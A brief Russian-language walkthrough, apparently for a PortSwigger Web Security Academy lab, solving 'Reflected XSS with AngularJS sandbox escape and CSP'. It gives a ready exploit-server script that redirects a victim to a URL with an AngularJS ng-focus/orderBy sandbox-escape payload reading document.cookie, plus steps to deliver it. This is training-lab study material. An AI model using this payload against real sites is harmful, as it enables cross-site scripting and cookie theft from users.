я не понял как эти гении до этого добрались. Может быть однажды додумаюсь. А может быть и нет. 

Перейдем в `exploit server`

```
<script>
location='https://0adb0052041460d18376230b0011001e.web-security-academy.net//?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```
и нажмем `store`, а потом `deliver exploit to victim`

и получим уведомление об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/27.%20Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP/pics%20for%20walkthrough/1.png)
